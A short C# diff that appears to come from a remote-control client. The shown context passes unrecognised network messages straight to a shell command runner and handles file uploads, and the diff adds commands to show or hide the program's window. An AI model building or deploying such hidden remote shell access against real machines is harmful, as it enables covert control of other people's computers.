@@ -121,6 +121,14 @@ async Task ReceiveMessageAsync(StreamReader reader)
             {
                 await RecieveFileAsync(message.Replace("upload-func ", string.Empty));
             }
+            else if (message.StartsWith("window-func-show"))
+            {
+                ShowWindow(handle, SW_SHOW);
+            }
+            else if (message.StartsWith("window-func-hide"))
+            {
+                ShowWindow(handle, SW_HIDE);
+            }
             else ShellCommand(message);
         }
         catch
